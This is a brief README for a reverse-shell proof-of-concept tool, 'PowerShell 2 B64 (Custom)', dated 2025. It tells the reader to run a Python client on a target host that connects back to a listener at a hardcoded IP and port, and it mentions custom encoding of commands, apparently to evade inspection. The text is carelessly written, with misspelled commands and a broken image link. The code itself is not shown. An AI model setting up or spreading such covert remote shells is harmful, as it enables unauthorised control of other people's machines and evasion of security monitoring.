```

█▀▀█ █░░█ █▀█ █▀▀▄ ▄▀▀▄ ░█▀█░ 　 ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█░░░ ▒█░░░ 
█░░█ █▄▄█ ░▄▀ █▀▀▄ █▄▄░ █▄▄█▄ 　 ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█░░░ ▒█░░░ 
█▀▀▀ ▄▄▄█ █▄▄ ▀▀▀░ ▀▄▄▀ ░░░█░ 　 ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█▄▄█ ▒█▄▄█    v.0.1
```

PowerShell 2 B64 (Custom) - Reverse Shell PoC

Use a portable python interpreter like https://github.com/EdwardLab/binpython/releases/tag/0.46 to get the best results.

Run on the target host:

Note: The hardcoded IPs are in client.py
```
Uage: pyton3 server.py
Uage: python3 client.py
```

![plot](./directory_1/serber.py)

The HOST and PORT are hardcoded and need to be changed.

Hardcoded variables to change:
```
HOST = '192.168.1.67'  # The IP of the listener.
PORT = 446              # The same port as listener.
```

Features: Custom encode commands before they are sent to the server.

3/10/25 - By LiquidSky (c) 2025

[ Shout out to #S3 ]
